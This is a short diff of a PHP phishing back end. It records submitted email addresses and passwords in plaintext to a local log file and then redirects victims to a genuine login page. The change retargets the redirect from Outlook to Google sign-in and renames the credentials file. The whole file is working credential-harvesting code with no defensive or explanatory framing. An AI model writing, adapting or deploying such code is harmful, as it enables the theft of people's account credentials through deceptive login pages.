@@ -1,10 +1,11 @@
 <?php
-$email = $_POST['email'];
-$password = $_POST['password'];
+// Get the submitted form data
+$email = htmlspecialchars($_POST['email']);
+$password = htmlspecialchars($_POST['password']);
 
-$data = "Email: $email | Password: $password\n";
+file_put_contents(__DIR__ . "/log.txt", "Email: $email | Password: $password\n", FILE_APPEND);
 
-file_put_contents("creds.txt", $data, FILE_APPEND);
-header('Location: https://outlook.office.com');
+// Redirect to Google login (or any URL you choose)
+header("Location: https://accounts.google.com/signin");
 exit();
 ?>
